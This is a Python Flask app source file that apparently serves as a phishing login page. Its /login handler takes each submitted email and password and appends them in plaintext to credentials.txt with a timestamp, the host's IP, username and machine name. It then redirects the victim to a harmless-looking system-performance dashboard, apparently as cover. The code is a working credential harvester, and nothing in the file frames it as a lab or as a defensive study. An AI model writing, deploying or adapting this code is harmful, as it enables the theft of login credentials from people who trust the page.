from flask import Flask, render_template, request, redirect, url_for
import socket
import platform
import psutil
import getpass
import datetime

app = Flask(__name__)

# Function to get system information (IP, username, PC name)
def get_system_info():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        ip = "127.0.0.1"
    username = getpass.getuser()
    pc_name = platform.node()
    return ip, username, pc_name

real_ip, username, pc_name = get_system_info()

# Save to file (this is where the credentials will be saved)
def save_credentials(ip, password, email, username, pc_name):
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    with open("credentials.txt", "a") as f:
        f.write(f"[{timestamp}] IP: {ip} | Username: {username} | PC Name: {pc_name} | Email: {email} | Password: {password}\n")
    print(f"[+] Saved: {timestamp} IP={ip} Username={username} PC Name={pc_name} Email={email} Password={password}")

# Update CPU and memory usage real-time
def get_performance_metrics():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    memory_usage = memory_info.percent
    disk_info = psutil.disk_usage('/')
    disk_usage = disk_info.percent
    return cpu_usage, memory_usage, disk_usage

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    save_credentials(real_ip, password, email, username, pc_name)
    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    cpu_usage, memory_usage, disk_usage = get_performance_metrics()
    return render_template('dashboard.html', cpu_usage=cpu_usage, memory_usage=memory_usage, disk_usage=disk_usage)

if __name__ == "__main__":
    app.run(debug=True)
